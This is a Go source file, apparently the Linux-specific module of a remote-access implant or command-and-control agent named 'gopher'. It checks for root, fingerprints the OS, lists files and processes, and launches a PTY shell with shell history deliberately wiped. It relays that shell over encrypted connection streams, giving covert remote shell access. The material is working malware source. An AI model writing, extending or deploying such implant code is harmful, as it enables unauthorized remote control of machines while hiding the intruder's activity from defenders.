//go:build linux
// +build linux

package functions

import (
	"crypto/cipher"
	"fmt"
	"gopher/utils"
	"io"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/creack/pty"
	"github.com/shirou/gopsutil/v4/process"
)

func GetCP() (uint32, uint32) {
	return 0, 0
}

func IsElevated() bool {
	return os.Geteuid() == 0
}

func GetOsVersion() (string, error) {
	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		return "", err
	}

	lines := strings.Split(string(data), "\n")

	var name, version string

	for _, line := range lines {
		if strings.HasPrefix(line, "NAME=") {
			name = strings.TrimPrefix(line, "NAME=")
			name = strings.Trim(name, "\"")
		}
		if strings.HasPrefix(line, "VERSION_ID=") {
			version = strings.TrimPrefix(line, "VERSION_ID=")
			version = strings.Trim(version, "\"")
		}
	}

	if name != "" && version != "" {
		return fmt.Sprintf("%s %s", name, version), nil
	}

	return "", nil
}

func NormalizePath(relPath string) (string, error) {
	if strings.HasPrefix(relPath, "~") {
		usr, err := user.Current()
		if err != nil {
			return "", err
		}
		relPath = filepath.Join(usr.HomeDir, relPath[1:])
	}
	path, err := filepath.Abs(relPath)
	if err != nil {
		return "", err
	}
	path = filepath.Clean(path)
	return path, nil
}

func GetListing(path string) ([]utils.FileInfo, error) {
	var Files []utils.FileInfo

	entries, err := os.ReadDir(path)
	if err != nil {
		return Files, err
	}

	for _, entry := range entries {
		fullPath := filepath.Join(path, entry.Name())
		info, err := os.Lstat(fullPath)
		if err != nil {
			return Files, err
		}

		mode := info.Mode()
		isLink := mode&os.ModeSymlink != 0

		isDir := info.IsDir()

		if isLink {
			if targetInfo, err := os.Stat(fullPath); err == nil {
				isDir = targetInfo.IsDir()
			}
		}

		stat, ok := info.Sys().(*syscall.Stat_t)
		var nlink uint64 = 1
		var uid, gid int
		if ok {
			nlink = uint64(stat.Nlink)
			uid = int(stat.Uid)
			gid = int(stat.Gid)
		}

		username := fmt.Sprintf("%d", uid)
		if u, err := user.LookupId(username); err == nil {
			username = u.Username
		}
		group := fmt.Sprintf("%d", gid)
		if g, err := user.LookupGroupId(group); err == nil {
			group = g.Name
		}

		fileInfo := utils.FileInfo{
			Mode:     mode.String(),
			Nlink:    int(nlink),
			User:     username,
			Group:    group,
			Size:     info.Size(),
			Date:     info.ModTime().Format("Jan _2 15:04"),
			Filename: entry.Name(),
			IsDir:    isDir,
		}
		Files = append(Files, fileInfo)
	}
	return Files, nil
}

func GetProcesses() ([]utils.PsInfo, error) {
	var Processes []utils.PsInfo

	procs, err := process.Processes()
	if err != nil {
		return nil, err
	}

	for _, p := range procs {
		ppid, err := p.Ppid()
		if err != nil {
			ppid = 0
		}

		username, err := p.Username()
		if err != nil {
			username = ""
		}

		tty, err := p.Terminal()

		cmdline, err := p.Cmdline()
		if err != nil || cmdline == "" {
			cmdline, _ = p.Name()
		}

		psInfo := utils.PsInfo{
			Pid:     int(p.Pid),
			Ppid:    int(ppid),
			Context: username,
			Tty:     tty,
			Process: cmdline,
		}
		Processes = append(Processes, psInfo)
	}

	return Processes, nil
}

func ProcessSettings(cmd *exec.Cmd) {}

func IsProcessRunning(cmd *exec.Cmd) bool {
	if cmd.Process == nil {
		return false
	}
	err := cmd.Process.Signal(syscall.Signal(0))
	if err != nil {
		return false
	}
	return true
}

func StartPtyCommand(process *exec.Cmd, columns uint16, rows uint16) (any, error) {
	process.Env = append(os.Environ(),
		"HISTORY=", "HISTSIZE=0", "HISTSAVE=",
		"HISTZONE=", "HISTLOG=",
		"HISTFILE=", "HISTFILE=/dev/null",
		"HISTFILESIZE=0", "TERM=xterm-256color",
	)
	windowSize := pty.Winsize{Rows: rows, Cols: columns}

	return pty.StartWithSize(process, &windowSize)
}

func StopPty(Pipe any) error {
	src := Pipe.(*os.File)
	return src.Close()
}

func RelayConnToPty(to any, from *cipher.StreamReader) {
	pipe := to.(*os.File)
	io.Copy(pipe, from)
}

func RelayPtyToConn(to *cipher.StreamWriter, from any) {
	pipe := from.(*os.File)
	io.Copy(to, pipe)
}

func Rev2Self() {}
